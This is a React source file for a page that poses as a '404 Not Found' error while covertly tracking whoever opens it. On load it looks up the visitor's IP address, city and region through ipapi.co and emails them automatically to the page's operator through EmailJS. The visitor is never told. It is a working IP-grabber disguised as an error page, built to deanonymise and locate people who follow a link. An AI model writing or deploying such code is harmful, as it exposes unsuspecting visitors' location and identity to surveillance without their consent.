import { useEffect, useRef, useState } from 'react'
import emailjs from '@emailjs/browser';

import './App.css'

function App() {
  const [dataIp, setDataIp] = useState(null);
  const form = useRef();

  const VITE_SERVICE_ID = import.meta.env.VITE_SERVICE_ID;
  const VITE_TEMPLATE_ID = import.meta.env.VITE_TEMPLATE_ID;
  const VITE_PUBLIC_KEY = import.meta.env.VITE_PUBLIC_KEY;

  useEffect(() => {
    fetch('https://ipapi.co/json/')
    .then((res) => res.json())
    .then((data) => {
      setDataIp(data);
    })
  }, [])

  useEffect(() => {
    emailjs.sendForm(
      VITE_SERVICE_ID, 
      VITE_TEMPLATE_ID, 
      form.current, 
      VITE_PUBLIC_KEY
      )
      .then((result) => {
          console.log(result.text);
      }, (error) => {
          console.log(error.text);
      });
  }, [dataIp])


  return (
    <>
    <form className='form' ref={form}>
      <input type="text" name="user_name" value={dataIp?.ip} />
      <input type="text" name="user_email" value={dataIp?.city}/>
      <input type="text" name="user_email" value={dataIp?.region}/>
    </form>

    <div className='error'>
      <div>404</div>
      <div>Not Found</div>
      <div>The resource requested could not be found on this server!</div>
    </div>
    </>
  )
}

export default App
